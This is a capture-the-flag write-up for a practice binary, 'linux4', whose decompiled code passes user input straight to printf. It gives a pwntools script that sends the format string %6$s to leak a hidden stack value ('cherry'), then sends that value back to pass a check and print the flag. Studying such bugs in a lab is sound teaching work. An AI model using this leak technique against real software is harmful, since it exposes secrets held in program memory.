# Linux4 CTF Writeup

## Challenge Overview

This challenge involves bypassing a logical check by leaking a hidden value from memory using a format string vulnerability. The program asks for a specific input ("fruit") and compares it to a value stored internally. If the value is correct, access is granted.

## Analysis

Upon execution, the binary prints:
```
Guard: I am hungry, I want to eat some fruit..
```

It then waits for user input. Internally, the program compares this input to a hidden value, likely stored on the stack or in memory. If the input matches, the program proceeds; otherwise, it exits.

The binary contains a format string vulnerability that allows me to leak data from the stack—specifically, the value the guard is expecting.

### Key Code Analysis

```c
iVar1 = rand();
strcpy((char *)&local_c2,(char *)((long)&local_b8 + (long)(iVar1 % 7) * 10));
puts("Guard: I am hungry, I want to eat some fruit..");
fgets(local_68,0x50,stdin);
puts("Guard: So you think I like?");
printf(local_68);
fgets(local_68,0x50,stdin);
iVar1 = strncmp(local_68,(char *)&local_c2,5);
if (iVar1 == 0) {
puts("Guard: Numnumnum..you..can..pass..numnumnum..");
vault();
}
else {
puts("Guard: You are wrong!");
}
```

The interesting part is that the value isn't accessed directly; instead, it's stored somewhere in memory. Using `%6$s`, we can dereference a pointer on the stack and leak the value.

## Exploitation and Payload Strategy

The strategy involves exploiting the **format string vulnerability** to leak the guard's expected input from memory.

steps:
1. Send a format string payload `%6$s` to print the 6th stack argument as a string.
2. Capture the leaked value from the output.
3. Send the leaked value back to the program to pass the string comparison check.

Here’s the exploit script:

```python
from pwn import *

p = process('./linux4')

# Step 1: wait for the guard prompt
p.recvuntil(b'Guard: I am hungry, I want to eat some fruit..')

# Step 2: leak the value from the stack using format string
p.sendline(b'%6$s')

# Step 3: extract leaked value from output
p.recvuntil(b'Guard: So you think I like?\n')
leaked = p.recvline().strip()
leaked = leaked.replace(b'?', b'')  # remove '?' if present
print(f'leaked value: {leaked}')

# Step 4: send the leaked string back
p.sendline(leaked)

# Step 5: interact with the process to receive the flag
p.interactive()
```

## Result and Solution

Running the exploit results in the following output:

```bash
┌──(kali㉿kali)-[~/linux_challenges/linux4]
└─$ /bin/python /home/kali/linux_challenges/linux4/solve.py
[+] Starting local process './linux4': pid 49924
leaked value: b'cherry'
[*] Switching to interactive mode
[*] Process './linux4' stopped with exit code 0 (pid 49924)
Guard: Numnumnum..you..can..pass..numnumnum..
flag_(this_is_your_flag_if_you_made_it)
[*] Got EOF while reading in interactive
$  
```
## Conclusion and Lessons

This challenge demonstrates the danger of format string vulnerabilities, especially when combined with unsafe input handling. By abusing the `%s` format specifier, which dereferences a pointer, we can leak secrets stored in memory and use them to bypass logic check

## References
- ![alt text](/img/image-6.png)
- ![alt text](/img/image-7.png)
